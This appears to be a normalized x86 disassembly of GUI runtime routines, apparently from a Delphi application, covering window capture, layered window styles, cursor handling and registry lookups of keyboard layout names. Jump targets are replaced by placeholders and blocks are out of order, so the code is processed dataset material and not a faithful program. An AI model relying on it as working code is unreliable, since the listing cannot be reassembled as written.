mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c92c
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45fdd0
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_446be4
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cc6b
mov eax [ ebp - 0x4 ]
call sub_45c9c4
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45cc6b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cd0f
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45df4c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45df4c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_41a230
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41a37c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_456f08
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45cd54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45cd54
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45cdc2
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45cd54
pop ecx
mov eax [ esi + 0x34 ]
call sub_452204
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_452214
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45ce48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444efc
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403448
sub_45ce6c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403448
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45ce9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ce6c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ce9c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45cf18
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45ce6c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45ce6c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45ce9c
pop ecx
test al al
je r-xdata
sub_45cf6c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403448
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45cf9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45cf6c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45cf9c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d018
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45cf6c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45cf6c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45cf9c
pop ecx
test al al
je r-xdata
sub_45d06c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_41a238
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44c84c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45d0c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45d06c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403448
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d13c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_420368
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45d178
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4408a8
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_441578
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45d1c0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_446be4
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_446be4
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_446be4
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_446be4
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_446be4
push eax
call RedrawWindow
sub_45d314
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_4580c4
mov dl 0x5
mov eax ebx
call sub_459e38
mov dl 0x1
mov eax ebx
call sub_445788
mov dl 0x3
mov eax ebx
call sub_45a134
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_45d37c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45d453
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_445648
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4454b4
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43f8d8
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_440338
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40408c
mov eax [ ebp - 0xc ]
call sub_40425c
push eax
mov eax [ ebp - 0xc ]
call sub_40445c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_440348
mov eax [ ebp - 0xc ]
call sub_40425c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d45a
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
mov dl 0x1
mov eax esi
call sub_4594b8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4403f4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045e8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45d480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4438dc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_458bdc
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4438a0
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403448
inc ebp
dec edi
jne r-xdata
sub_45d4cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_445648
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45d4f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445e50
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45d520
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b888
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446be4
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_445648
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446be4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_446be4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44565c
or ecx 0xffffffff
mov dl 0x1
call sub_440a6c
pop esi
pop ebx
retn
sub_45d5b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4462c0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_441578
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43fd64
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403448
sub_45d60e
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45d6d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_440338
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40408c
mov eax [ ebp - 0x4 ]
call sub_40425c
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_440348
mov eax [ ebp - 0x4 ]
call sub_40425c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4403f4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d6dd
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_4594b8
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045e8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45d6fc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_446040
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_445648
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44565c
mov dl [ ebx + 0x57 ]
call sub_4402e4
inc edi
dec esi
jne r-xdata
sub_45d7a0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45d7d0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45d800
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fbd8
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45dba4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45dbb0
mov eax ebx
call sub_45dbbc
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_459fd8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45dfdc
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45deb8
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45deb8
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45deb8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_45d958
push ebx
push esi
push edi
push ebp
call sub_4035d8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_40324c
mov eax [ ebp + 0x88 ]
call sub_40324c
mov eax [ ebp + 0x84 ]
call sub_40324c
mov eax [ ebp + 0x54 ]
call sub_40324c
mov eax [ ebp + 0x50 ]
call sub_40324c
mov eax [ ebp + 0x4c ]
call sub_40324c
mov eax [ ebp + 0x30 ]
call sub_40324c
mov eax [ ebp + 0x34 ]
call sub_40324c
mov eax [ ebp + 0x7c ]
call sub_40324c
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_40324c
mov eax ebp
call sub_45dc18
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41fc24
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035c0
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_41a238
call sub_40324c
inc edi
dec esi
jne r-xdata
sub_45dad0
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45db1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a0dc
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a0dc
mov eax [ rw-data ]
call sub_460950
sub_45db54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a37c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a37c
mov eax [ rw-data ]
call sub_460950
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_4481bc
sub_45dbbc
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45dc74
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45dc18
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4027d4
mov ebx esi
test ebx ebx
jne r-xdata
sub_45dc74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4027b4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45dc9c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45de47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de4e
lea eax [ ebp - 0x260 ]
call sub_403f9c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f9c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41bdc8
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408f4c
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44b920
test al al
je r-xdata
xor eax eax
push ebp
push sub_45de03
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40420c
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_40420c
sub_45deb8
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_4607c0
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460574
mov dl 0x1
mov eax [ rw-data ]
call sub_460574
sub_45df24
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
